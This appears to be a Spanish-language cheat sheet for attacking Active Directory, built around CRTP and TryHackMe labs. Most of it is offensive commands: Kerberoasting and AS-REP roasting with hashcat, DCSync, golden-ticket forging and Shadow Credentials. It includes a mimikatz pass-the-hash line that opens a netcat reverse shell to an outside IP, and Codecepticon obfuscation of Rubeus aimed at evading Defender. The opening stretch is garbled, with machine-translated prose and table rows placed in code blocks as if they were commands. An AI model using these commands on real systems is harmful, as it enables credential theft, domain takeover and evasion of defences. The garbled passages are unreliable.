Al igual que en la sección anterior, iniciaremos Hashcat con los argumentos 13100 como modo, rockyou.txt como lista de palabras, best64.rule como archivo de reglas y --force mientras realizamos el craqueo en una VM.
```

#### Command execution
```bash
A continuación, ejecutemos Kerberoasting desde Linux. Podemos usar impacket-GetUserSPNs con la IP del controlador de dominio como argumento para -dc-ip . Dado que nuestra máquina Kali no está unida al dominio, también debemos proporcionar las credenciales del usuario del dominio para obtener el hash TGS-REP. Como antes, podemos usar -request para obtener el TGS y generarlo en un formato compatible con Hashcat.
```

#### Command execution
```bash
| Movimiento lateral en Active Directory - WMI y WinRM - VM Group 1 |  |  |
```

#### Command execution
```bash
| Movimiento lateral en Active Directory - WMI y WinRM - VM Group 2 |  |  |
```

#### Command execution
```bash
Para iniciar una sesión interactiva en el host remoto, necesitamos invoca PsExec64.exe con el argumento -i, seguido de la función El nombre de host de destino se antepone con dos barras invertidas. A continuación, especificaremos el dominio\nombre de usuario como corp\jen para el argumento -u y Nexus123! como contraseña para los argumentos -p. Por último, incluirá el proceso que queremos ejecutar de forma remota. Aquí usaremos el shell de comandos.
```

#### Command execution
```bash
| Movimiento lateral en Active Directory - PsExec - VM Group 1 |  |  |
```

#### Command execution
```bash
| Movimiento lateral en Active Directory - PsExec - VM Group 2 |  |  |
```

#### Command execution
```bash
| Movimiento lateral en Active Directory - DCOM - VM Group 1 |  |  |
```

#### Command execution
```bash
| Movimiento lateral en Active Directory - DCOM - VM Group 2 |  |  |
```

#### Command execution
```bash
Ahora, proporcionaremos el SID del dominio (que podemos reunirse con whoami /usuario) al Mimikatz kerberos::dorado comando para crear el billete dorado.
```

#### Command execution
```bash
Esta vez, utilizaremos el /krbtgt opción en lugar de /rc4 to indique que estamos proporcionando el hash de contraseña del krbtgt usuario account. A partir de julio de 2022, Microsoft mejoró el autenticación proceso, entonces necesitaremos proporcionar una cuenta existente. Vamos a poner el dorado nombre de usuario del ticket a jen. Antes no importaba si la cuenta existió.
```

#### Command execution
```bash
Mimikatz proporciona dos conjuntos de valores predeterminados al utilizar el dorado Opción de ticket: el ID de usuario y el ID de grupo. El ID de usuario está configurado en 500 por defecto, que es el RID del administrador integrado para el dominio. Los valores para los grupos ID consisten en los más privilegiados grupos en Active Directory, incluido el grupo Administradores de dominio.
```

#### Command execution
```bash
.\SharpHound.exe -c All -d <domain> -u <user> -p <pass> -f AllData
```

#### Command execution
```bash
bloodhound-python -u <user> -p <pass> -d <domain> -dc <DC_IP> -c All
```

#### Command execution
```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt
```

#### Command execution
```bash
.\SharpHound.exe -c All --domain domain.local
```

#### Command execution
```bash
bloodhound-python -u user -p password -d domain.local -dc dc01.domain.local -c All
```

#### Command execution
```bash
BloodHound - Mapeo de AD
```

#### Command execution
```bash
Invoke-Binary .\SharpHound.exe
```

#### Command execution
```bash
Invoke-BloodHound -CollectionMethod All
```

#### Command execution
```bash
python3 bloodhound-python -u user -p pass -d domain.local -dc DC01 -c all
```

#### Command execution
```bash
python3 certipy-ad find -u user@domain.local -p 'Password123' -dc-ip DC_IP -stdout
```

#### Command execution
```bash
Rubeus.exe asktgt /user:svc_account /password:Password123 /domain:domain.local
```

#### Command execution
```bash
python3 secretsdump.py -just-dc domain/user:pass@DC_IP
```

#### Command execution
```bash
python3 bloodhound-python -u user -p 'Password123' -d domain.local -dc DC_IP -c All
```

#### Command execution
```bash
python3 bloodhound-python -u user -p 'Password123' -d domain.local -ns DC_IP -c All --zip
```

#### Command execution
```bash
.\SharpHound.exe -c All --zipfilename output.zip
```

#### Command execution
```bash
pip3 install azurehound # BloodHound para Azure
```

#### Windows Backdoors & Persistence CheatSheet (Formato C)
```bash
Usar tuberías para stdin/stdout/stderr
```

#### rpcclient Comandos útiles / Bruteforce de usuarios RID: Encadena comandos o filtra resultados para obtener información más útil.
```bash
for i in $(seq 500 1100); do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done
```

#### ⚡ SCRIPT AUTOMATIZADO MIMIKATZ / Script completo PtH: Extrae credenciales, tickets o secretos de memoria y del dominio.
```bash
mimikatz sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\\tools\\nc64.exe -e cmd.exe 10.50.100.146 5555"
```

#### Ejecuta el collector de BloodHound en Windows recopilando toda la informacion: sesiones, ACLs, trusts, grupos, GPOs. Genera un ZIP para importar en BloodHound.
```bash
SharpHound.exe -c All --zipfilename bloodhound_output.zip
```

#### Collector de BloodHound en Python ejecutable desde Linux. Recopila la misma informacion que SharpHound sin necesidad de ejecutar en el objetivo Windows.
```bash
bloodhound-python -u '<usuario>' -p '<password>' -d domain.local -ns <DC_IP> -c All
```

#### Inicia la base de datos Neo4j y la interfaz grafica de BloodHound. Se importan los archivos ZIP del collector para visualizar caminos de ataque al Domain Admin.
```bash
sudo neo4j start && bloodhound
```

#### Recopilacion en modo sigiloso que reduce el ruido generado. Evita enumerar sesiones masivamente y usa metodos menos detectables por EDR.
```bash
SharpHound.exe -c All --stealth
```

#### Importa PowerView y lista usuarios con Service Principal Names (SPNs) configurados. Estos usuarios son vulnerables a Kerberoasting.
```bash
Import-Module .\PowerView.ps1; Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```

#### Enumera grupos con privilegios administrativos en el dominio (adminCount=1). Identifica los grupos mas valiosos para escalar privilegios.
```bash
Get-DomainGroup -AdminCount | select samaccountname,memberof
```

#### Enumera shares de red en el dominio y verifica cuales son accesibles por el usuario actual. Busca shares con informacion sensible como scripts, backups o credenciales.
```bash
Find-DomainShare -CheckShareAccess
```

#### Kerberoasting desde Linux con Impacket: solicita TGS tickets para cuentas con SPN. Los hashes se guardan en formato hashcat para crackeo offline.
```bash
impacket-GetUserSPNs -request -dc-ip <DC_IP> domain.local/usuario:password -outputfile kerberoast_hashes.txt
```

#### Kerberoasting con pass-the-hash (Impacket). Usa hash NTLM en lugar de password para solicitar TGS tickets.
```bash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> domain.local/usuario -outputfile hashes.kerberoast
```

#### Kerberoasting desde Windows con Rubeus. Solicita tickets TGS para todas las cuentas con SPN y guarda los hashes.
```bash
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
```

#### Kerberoast de un usuario especifico con Rubeus. Menos ruidoso que atacar todos los SPNs.
```bash
Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
```

#### Kerberoast solo administradores (admincount=1). /nowrap muestra hashes sin saltos de linea para copiar facilmente.
```bash
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

#### Crackea hashes Kerberoast (TGS-REP tipo 23) con hashcat. -m 13100 es el modo para Kerberos 5 TGS-REP etype 23.
```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### AS-REP Roasting: extrae hashes de usuarios sin pre-autenticacion Kerberos. No necesita credenciales validas.
```bash
impacket-GetNPUsers domain.local/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -outputfile asrep_hashes.txt
```

#### Crackea hashes AS-REP con hashcat. -m 18200 es el modo para Kerberos 5 AS-REP etype 23.
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Kerberoast sin cuenta de dominio. Usa un usuario sin pre-autenticacion para solicitar TGS de otros usuarios.
```bash
GetUserSPNs.py -no-preauth 'NO_PREAUTH_USER' -usersfile users.txt -dc-host dc.domain.local domain.local/
```

#### Ataque DCSync: simula ser un Domain Controller y solicita la replicacion del hash NTLM del usuario especificado. Requiere privilegios de replicacion en el dominio.
```bash
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:domain\administrator" "exit"
```

#### Crea un Golden Ticket: TGT falso firmado con el hash de krbtgt. Proporciona acceso total al dominio como cualquier usuario. /ptt lo inyecta directamente en memoria.
```bash
mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt"
```

#### DCSync completo: extrae todos los hashes NTLM del dominio simulando replicacion de DC. -just-dc-ntlm extrae solo hashes NTLM sin tickets ni claves DES.
```bash
impacket-secretsdump domain.local/administrator@<DC_IP> -just-dc-ntlm
```

#### AS-REP Roasting con Rubeus desde Windows. Busca automaticamente usuarios sin pre-autenticacion y extrae sus hashes en formato compatible con hashcat.
```bash
Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat
```

#### Enumera plantillas de certificados vulnerables (ESC1-ESC8). Busca 'Vulnerable' en el output.
```bash
certipy find -u user@domain.local -p 'Password' -dc-ip DC_IP
```

#### Shadow Credentials: añade Key Credential al usuario objetivo y obtiene su hash NTLM via PKINIT.
```bash
certipy shadow auto -u user@domain.local -p 'Password' -account target_user
```

#### Accede al SYSVOL compartido. Busca archivos Groups.xml que contengan cpassword (contraseñas GPP cifradas).
```bash
smbclient //DC_IP/SYSVOL -U 'domain/user%password'
```

#### Busca archivos Groups.xml en SYSVOL montado localmente. Contienen cpassword si hay GPP Password configuradas.
```bash
find /tmp/sysvol -name "Groups.xml" 2>/dev/null
```

#### Descifra el campo cpassword de Groups.xml. AES-256 con clave publicada por Microsoft — siempre descifrable.
```bash
gpp-decrypt 'AzVJmXh28ogNqKBLV7X+vNFHgJHm9WKMq5QoqhJT...'
```

#### Punto de entrada LDAP del dominio. Te muestra naming contexts: defaultNamingContext, schemaNamingContext y configurationNamingContext. Sirve para ubicar donde viven objetos, esquema y configuracion.
```bash
Get-ADRootDSE
```

#### Schema: lista clases de objeto definidas en AD. El esquema explica que tipos de objetos existen y que atributos puede tener cada uno.
```bash
Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter '(objectClass=classSchema)' -Properties lDAPDisplayName | Select-Object lDAPDisplayName
```

#### Global Catalog: muestra GCs del bosque y dominios. El GC contiene informacion parcial de objetos del bosque para busquedas rapidas entre dominios.
```bash
Get-ADForest | Select-Object Name,GlobalCatalogs,Domains
```

#### Detalle de partners y estado de replicacion. Util para entender por que un cambio hecho en un DC aun no aparece en otro.
```bash
repadmin /showrepl
```

#### Forest: limite de seguridad principal. Puede contener multiples dominios. En CRTP esto importa porque Enterprise Admins, trusts y Global Catalog viven a nivel de bosque.
```bash
Get-ADForest
```

#### Domain: limite administrativo dentro del forest. Devuelve SID, PDC, DNSRoot, DistinguishedName y politicas como MachineAccountQuota.
```bash
Get-ADDomain
```

#### OUs: contenedores logicos para organizar objetos y aplicar GPOs. No son limite de seguridad por si mismas, pero suelen reflejar delegacion administrativa.
```bash
Get-ADOrganizationalUnit -Filter * | Select-Object Name,DistinguishedName
```

#### Enumera particiones/dominios registrados en el bosque. Ayuda a pensar en estructura antes de atacar rutas.
```bash
Get-ADObject -LDAPFilter '(objectClass=domainDNS)' -SearchBase (Get-ADForest).PartitionsContainer
```

#### Trusts: relaciones entre dominios/bosques. Si existen, pueden abrir rutas fuera del dominio inicial.
```bash
Get-ADTrust -Filter *
```

#### PowerView: lista OUs y GPOs linkadas. Une estructura AD con impacto real de politicas.
```bash
Get-DomainOU -Properties name,gplink,distinguishedname
```

#### Dot sourcing: carga funciones del script en la sesion actual. Despues puedes llamar Get-DomainUser, Get-DomainComputer, etc.
```bash
. C:\AD\Tools\PowerView.ps1
```

#### Importa un modulo PowerShell. ADModule da cmdlets nativos como Get-ADUser, Get-ADComputer y Get-ADGroupMember.
```bash
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

#### Despues de dot source, muchas funciones quedan sin Source de modulo. Util para ver que funciones has cargado en memoria.
```bash
Get-Command -CommandType Function | Where-Object Source -eq ''
```

#### Carga la version modificada con dot sourcing. Hazlo despues de validar que el archivo parsea y que solo contiene lo necesario para el ejercicio.
```bash
. C:\AD\Tools\PowerUp.min.ps1
```

#### Revision basica del archivo. RedDrill lo deja como nota conceptual porque el propio material CRTP remite al Bonus Learning Objective y avisa de limitaciones en la student VM.
```bash
Get-Content C:\AD\Tools\Invoke-Mimikatz.ps1 -TotalCount 20
```

#### Codecepticon puede generar comandos de ofuscacion para proyectos .NET. Primero revisa opciones; no lances perfiles a ciegas.
```bash
C:\AD\Tools\Codecepticon.exe --help
```

#### Ejemplo CRTP de ofuscacion de fuente para Rubeus. Cambia nombres y reescribe strings; despues debes abrir/compilar/verificar. Usalo solo en lab autorizado.
```bash
C:\AD\Tools\Codecepticon.exe --action obfuscate --module csharp --verbose --path "C:\AD\Tools\Rubeus-master\Rubeus.sln" --map-file "C:\AD\Tools\Rubeus-master\Mapping.html" --profile rubeus --rename ncefpavs --rename-method markov --markov-min-length 3 --markov-max-length 10 --markov-min-words 3 --markov-max-words 5 --string-rewrite --string-rewrite-method xor
```

#### Abre el mapping generado para entender que renombro Codecepticon. El mapa es clave para depurar despues de ofuscar.
```bash
Start-Process C:\AD\Tools\Rubeus-master\Mapping.html
```

#### Verifica el binario resultante. Si compila pero sigue detectado, vuelve al ciclo: medir -> localizar -> modificar minimo -> recompilar.
```bash
DefenderCheck.exe C:\AD\Tools\Rubeus-master\Rubeus\bin\Release\Rubeus.exe
```

#### Contexto inicial: host, red, DNS y DC usado. La metodologia empieza por entender desde donde operas.
```bash
hostname; ipconfig /all; nltest /dsgetdc:moneycorp.local
```

#### Admin Recon: identifica cuentas/grupos con privilegio alto. Sirve para orientar rutas, no para tocar nada todavia.
```bash
Get-DomainGroupMember -Identity 'Domain Admins' -Recurse
```

#### Recon interno y datos: shares, ficheros sensibles y ACLs. En Assume Breach, el acceso interno suele abrir rutas por mala exposicion.
```bash
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
```

#### Mapa relacional para pasar de enumeracion a rutas. BloodHound ayuda a decidir el siguiente paso: local priv esc, admin recon, lateral movement o ACL abuse.
```bash
bloodhound-python -u studentx -p 'PASSWORD' -d dollarcorp.moneycorp.local -dc dcorp-dc.dollarcorp.moneycorp.local -c All
```

#### Dominio raiz moneycorp.local. En el lab se usa como referencia para entender dominios hijos y relaciones.
```bash
Get-ADDomain -Identity moneycorp.local
```

#### Dominio dollarcorp.moneycorp.local, donde suele estar la VM student y buena parte de la practica.
```bash
Get-ADDomain -Identity dollarcorp.moneycorp.local
```

#### Dominio hijo/relacionado del lab. Enumerarlo ayuda a entender rutas entre dominios.
```bash
Get-ADDomain -Identity us.dollarcorp.moneycorp.local
```

#### Forest/dominio externo del lab. Si aparece en trusts, puede haber rutas cross-forest.
```bash
Get-ADDomain -Identity eurocorp.local
```

#### PowerView: obtiene el dominio actual desde el contexto del usuario. Primer comando para ubicarte.
```bash
Get-Domain
```

#### PowerView: consulta otro dominio. Util cuando ya sabes que existe moneycorp.local y quieres sacar su objeto dominio.
```bash
Get-Domain -Domain moneycorp.local
```

#### ADModule: forma directa de sacar DomainSID desde el objeto dominio actual.
```bash
(Get-ADDomain).DomainSID
```

#### PowerView: politicas del dominio actual. Mira SystemAccess para password policy, lockout y otros controles basicos.
```bash
Get-DomainPolicyData
```

#### PowerView: politicas de otro dominio. No asumas que todos los dominios del forest tienen la misma politica.
```bash
(Get-DomainPolicyData -Domain moneycorp.local).systemaccess
```

#### PowerView: controladores de dominio del dominio actual. Identifica DCs, roles y nombres para LDAP/Kerberos.
```bash
Get-DomainController
```

#### ADModule: lista DCs del dominio actual usando modulo firmado.
```bash
Get-ADDomainController
```

#### PowerView: DCs de otro dominio.
```bash
Get-DomainController -Domain moneycorp.local
```

#### ADModule: descubre DC de otro dominio. Util para validar DNS/site discovery.
```bash
Get-ADDomainController -DomainName moneycorp.local -Discover
```

#### Inventario inicial de usuarios con atributos utiles: nombres, descripcion, grupos y actividad aproximada.
```bash
Get-DomainUser -Properties samaccountname,description,memberof,lastlogontimestamp | Select-Object samaccountname,description,memberof,lastlogontimestamp
```

#### ADModule equivalente para enumerar usuarios con propiedades relevantes.
```bash
Get-ADUser -Filter * -Properties Description,MemberOf,LastLogonTimestamp | Select-Object SamAccountName,Description,MemberOf,LastLogonTimestamp
```

#### PowerView: lista equipos del dominio actual. Primer paso para scope de servidores, workstations y targets.
```bash
Get-DomainComputer | Select-Object Name
```

#### ADModule: lista equipos de dominio.
```bash
Get-ADComputer -Filter * | Select-Object Name
```

#### ADModule + Test-Connection: prueba conectividad ICMP contra equipos con DNSHostName. Puede ser ruidoso; usa scope controlado.
```bash
Get-ADComputer -Filter * -Properties DNSHostName | ForEach-Object { Test-Connection -Count 1 -ComputerName $_.DNSHostName }
```

#### PowerView: lista grupos del dominio actual. Empieza por nombres antes de pedir propiedades completas.
```bash
Get-DomainGroup | Select-Object Name
```

#### PowerView: grupos de otro dominio.
```bash
Get-DomainGroup -Domain targetdomain.local
```

#### ADModule: lista grupos del dominio actual.
```bash
Get-ADGroup -Filter * | Select-Object Name
```

#### ADModule: propiedades completas de grupos. Util para revisar descripcion, managedBy y membresias, pero puede ser voluminoso.
```bash
Get-ADGroup -Filter * -Properties *
```

#### PowerView: busca grupos con admin en el nombre. No todos son criticos, pero es un filtro rapido para priorizar.
```bash
Get-DomainGroup '*admin*'
```

#### ADModule: equivalente para grupos con admin en el nombre.
```bash
Get-ADGroup -Filter 'Name -like "*admin*"' | Select-Object Name
```

#### ADModule: miembros recursivos de Domain Admins.
```bash
Get-ADGroupMember -Identity 'Domain Admins' -Recursive
```

#### PowerView: grupos de un usuario concreto. Sirve para saber que permisos hereda tu cuenta.
```bash
Get-DomainGroup -UserName 'student1'
```

#### ADModule: grupos de un principal. Buen comando para contexto inicial de una cuenta.
```bash
Get-ADPrincipalGroupMembership -Identity student1
```

#### PowerView: lista grupos locales en una maquina. Requiere privilegios admin en maquinas no-DC; en DC el modelo de grupos locales cambia.
```bash
Get-NetLocalGroup -ComputerName dcorp-dc
```

#### PowerView: miembros del grupo local Administrators. Requiere privilegios adecuados en el objetivo.
```bash
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```

#### Usuarios activamente logueados en un equipo. Requiere admin local en el target; muy util para cazar sesiones, pero sensible.
```bash
Get-NetLoggedon -ComputerName dcorp-adminsrv
```

#### Usuarios logueados localmente usando Remote Registry. Requiere que Remote Registry este disponible y permisos adecuados.
```bash
Get-LoggedonLocal -ComputerName dcorp-adminsrv
```

#### Ultimo usuario logueado en un equipo. Requiere privilegios administrativos y Remote Registry en el target.
```bash
Get-LastLoggedOn -ComputerName dcorp-adminsrv
```

#### Revisa scope antes de lanzar PowerHuntShares. En el lab, servers.txt evita incluir el DC para mejor OPSEC.
```bash
Get-Content C:\AD\Tools\servers.txt
```

#### Collector PowerShell. Util si estas trabajando con PowerShell, aunque puede tener mas friccion con controles modernos.
```bash
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
```

#### Collector desde Linux. En CRTP te ayuda a poblar BloodHound sin depender de ejecutar binarios en Windows.
```bash
bloodhound-python -u user -p pass -d dollarcorp.moneycorp.local -dc dcorp-dc.dollarcorp.moneycorp.local -c All
```

#### Ejemplo conceptual de Cypher: shortest path hacia Domain Admins. Ajusta nombres al dominio real cargado.
```bash
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOLLARCORP.MONEYCORP.LOCAL'})) RETURN p
```

#### BloodHound Legacy collector via Loader en el lab. Recoge datos para subirlos a BloodHound Legacy. Alto volumen: usar cuando el objetivo es aprendizaje completo, no sigilo.
```bash
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors\SharpHound.exe -args --collectionmethods All
```

#### SharpHound para BloodHound CE. Los datos recogidos pueden subirse a BloodHound CE; en el lab el acceso web puede ser read-only.
```bash
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Sharphound\SharpHound.exe -args --collectionmethods All
```

#### Biblioteca publica de Cypher queries de SpecterOps. Usala para aprender consultas y adaptar rutas, no para copiar sin entender el grafo.
```bash
Start-Process https://queries.specterops.io/
```

#### Coleccion menos ruidosa: quita metodos como RDP, DCOM, PSRemote y LocalAdmin. Nota CRTP: Session puede seguir consultando DCs aunque uses -ExcludeDCs; entiende limitaciones.
```bash
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs
```

#### Variante para collector legacy: elimina CertServices si no esta soportado. Buen ejemplo de adaptar collection methods a version de collector.
```bash
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs
```

#### Coleccion aun mas contenida para relaciones AD principales. Menos datos significa menos rutas visibles; tradeoff entre cobertura y ruido.
```bash
SharpHound.exe --collectionmethods Group,Trusts,ACL,ObjectProps,SPNTargets --excludedcs
```

#### ADWS usa puerto 9389. Antes de SOAPHound, valida alcance al servicio Active Directory Web Services.
```bash
Test-NetConnection dcorp-dc.dollarcorp.moneycorp.local -Port 9389
```

#### Construye cache con informacion basica de objetos usando ADWS. Menos consultas LDAP directas; util para estudiar alternativas de enumeracion.
```bash
SOAPHound.exe --buildcache -c C:\AD\Tools\cache.txt
```

#### Genera salida compatible con BloodHound desde cache SOAPHound. --nolaps evita recolectar LAPS en este flujo.
```bash
SOAPHound.exe -c C:\AD\Tools\cache.txt --bhdump -o C:\AD\Tools\bloodhound-output --nolaps
```

#### Revisa los archivos generados antes de subirlos. No asumas que la coleccion produjo todo lo esperado.
```bash
Get-ChildItem C:\AD\Tools\bloodhound-output
```

#### Usando PowerView - Enumerate user. Enumeracion PowerView de usuarios o atributos de usuario.
```bash
Get-DomainUser | select -ExpandProperty samaccountname
```

#### Usando PowerView - Details of Domain Admins group
```bash
Get-DomainGroup -Identity "Domain Admins"
```

#### Usando PowerView - Enumerate members of the Domain Admins group. Enumera miembros de grupos privilegiados.
```bash
Get-DomainGroupMember -Identity "Domain Admins"
```

#### Usando PowerView - Enumerate members of the Enterprise Admins group. Enumera miembros de grupos privilegiados.
```bash
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

#### Usando Active Directory module (ADModule) - Enumerate user
```bash
Get-ADUser -Filter * -Properties * | select Samaccountname,Description
```

#### Usando Active Directory module (ADModule) - Enumerate members of the Domain Admins group
```bash
Get-ADGroupMember -Identity 'Domain Admins'
```

#### Usando Active Directory module (ADModule) - Enumerate members of the Enterprise Admins group
```bash
Get-ADGroupMember -Identity 'Enterprise Admins' -Server moneycorp.local
```

#### Access token: identidad y grupos del proceso/usuario. Las decisiones de acceso comparan token contra ACEs del objeto.
```bash
whoami /groups
```

#### Security descriptor basico: owner, group y DACL/Access. Con ADModule puedes leer ACLs, pero sin resolver GUIDs como PowerView.
```bash
Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' | Select-Object Owner,Group,Access
```

#### PowerView: ACLs asociadas a un objeto especifico resolviendo GUIDs para hacer legible el permiso.
```bash
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDS
```

#### Busca ACEs interesantes en el dominio: WriteDacl, GenericAll, GenericWrite, WriteOwner, AddMember, etc.
```bash
Find-InterestingDomainAcl -ResolveGUIDS
```

#### Tareas - Enumerate ACLs for the Domain Admins group. Enumera ACLs del objeto objetivo y resuelve GUIDs.
```bash
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

#### Tareas - Check permissions for RDPUsers group. Busca ACLs interesantes que puedan convertirse en escalada.
```bash
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

#### Lista GPOs del dominio. Una GPO es una coleccion virtual de settings, permisos y scope de management aplicable a users/computers.
```bash
Get-DomainGPO
```

#### Lista OUs. Una OU es contenedor de bajo nivel donde se aplican GPOs y se delega administracion.
```bash
Get-DomainOU
```

#### Consulta una GPO por GUID leido desde gplink. Sustituye el GUID por el real de tu OU.
```bash
Get-DomainGPO -Identity '{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}'
```

#### Busca GPOs que usan Restricted Groups o Groups.xml para grupos locales interesantes.
```bash
Get-DomainGPOLocalGroup
```

#### Usuarios/grupos que acaban en grupos locales de una maquina mediante GPO.
```bash
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1
```

#### Maquinas donde un usuario dado es miembro de un grupo local especifico por GPO. Muy util para rutas de local admin.
```bash
Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
```

#### Tareas - List all OUs. Enumera OUs y sus propiedades relevantes.
```bash
Get-DomainOU | select -ExpandProperty name
```

#### Tareas - List all the computers in the DevOps OU. Enumeracion PowerView de equipos o atributos de equipos.
```bash
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

#### Tareas - Enumerate GPO applied on the DevOps OU. Enumera OUs y sus propiedades relevantes.
```bash
(Get-DomainOU -Identity DevOps).gplink
```

#### Tareas - Enumerate GPO applied on the DevOps OU. Enumera o resuelve GPOs aplicables.
```bash
Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```

#### Tareas - One liner for above. Enumera OUs y sus propiedades relevantes.
```bash
Get-DomainGPO -Identity (Get-DomainOU -Identity DevOps).gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)
```

#### PowerView: trusts del dominio actual. Un trust permite acceso entre dominios/forests y se representa como Trusted Domain Object.
```bash
Get-DomainTrust
```

#### PowerView: trusts de otro dominio.
```bash
Get-DomainTrust -Domain moneycorp.local
```

#### ADModule: detalles de un trust concreto. Revisa Direction, TrustType y ForestTransitive.
```bash
Get-ADTrust -Identity eurocorp.local
```

#### Contexto para interpretar trusts automaticos parent-child dentro del mismo forest.
```bash
Get-Domain | Select-Object Name,Forest,Parent
```

#### Mapea direction y tipo de trust. Regla mental: direction of trust y direction of access van en sentido contrario en one-way trust.
```bash
Get-DomainTrust | Select-Object SourceName,TargetName,TrustDirection,TrustType,TrustAttributes
```

#### ADModule: muestra si el trust es inbound/outbound/bidirectional, external/forest y si es transitivo.
```bash
Get-ADTrust -Filter * | Select-Object Name,Direction,TrustType,ForestTransitive,IntraForest
```

#### PowerView: trusts desde otro dominio. Util para comprobar parent-child y rutas entre dominios del mismo forest.
```bash
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
```

#### PowerView: detalles del forest actual. Punto base para entender dominios, trusts, GCs y naming.
```bash
Get-Forest
```

#### PowerView: detalles de otro forest si hay visibilidad/trust.
```bash
Get-Forest -Forest eurocorp.local
```

#### ADModule: forest externo/objetivo. Puede fallar si DNS/trust no lo permite.
```bash
Get-ADForest -Identity eurocorp.local
```

#### PowerView: dominios del forest actual.
```bash
Get-ForestDomain
```

#### PowerView: dominios de otro forest.
```bash
Get-ForestDomain -Forest eurocorp.local
```

#### ADModule: lista dominios del forest actual.
```bash
(Get-ADForest).Domains
```

#### PowerView: Global Catalogs del forest actual.
```bash
Get-ForestGlobalCatalog
```

#### PowerView: GCs de otro forest.
```bash
Get-ForestGlobalCatalog -Forest eurocorp.local
```

#### ADModule: extrae Global Catalogs del forest actual.
```bash
Get-ADForest | Select-Object -ExpandProperty GlobalCatalogs
```

#### PowerView: forest trusts. En algunos labs no hay forest trusts; eso tambien es un resultado.
```bash
Get-ForestTrust
```

#### ADModule: filtra objetos trust con informacion de forest trust.
```bash
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

#### Usando PowerView - To enumerate all domains in the current forest. Enumera dominios del forest o usa cada dominio para consultar trusts.
```bash
Get-ForestDomain -Verbose
```

#### Usando PowerView - To list only the external trusts in the moneycorp.local forest. Mapea trusts del dominio actual o indicado.
```bash
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

#### Usando PowerView - To identify external trusts of the dollarcorp domain. Mapea trusts del dominio actual o indicado.
```bash
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

#### Usando PowerView - To enumerate trusts for eurocorp.local forest. Mapea trusts del dominio actual o indicado.
```bash
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```

#### Usando Active Directory module - To list all the trusts in the moneycorp.local forest. Enumera trusts usando el modulo Active Directory.
```bash
Get-ADForest | %{Get-ADTrust -Filter *}
```

#### Usando Active Directory module - To list only the external trusts in moneycorp.local domain. Enumera trusts usando el modulo Active Directory.
```bash
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
```

#### Usando Active Directory module - To identify external trusts of the dollarcorp domain. Enumera trusts usando el modulo Active Directory.
```bash
Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'
```

#### Usando Active Directory module - To enumerate trusts for eurocorp.local forest. Enumera trusts usando el modulo Active Directory.
```bash
Get-ADTrust -Filter * -Server eurocorp.local
```

#### Busca maquinas donde el usuario actual tiene admin local. Consulta equipos del dominio y prueba acceso local; puede ser ruidoso.
```bash
Find-LocalAdminAccess -Verbose
```

#### Busca equipos donde usuarios privilegiados tienen sesiones. Por defecto usa miembros de Domain Admins, equipos del dominio y consultas de sesion/loggedon.
```bash
Find-DomainUserLocation -Verbose
```

#### User hunting para un grupo concreto. Te ayuda a buscar sesiones de usuarios con permisos utiles sin limitarte a Domain Admins.
```bash
Find-DomainUserLocation -UserGroupIdentity 'RDPUsers'
```

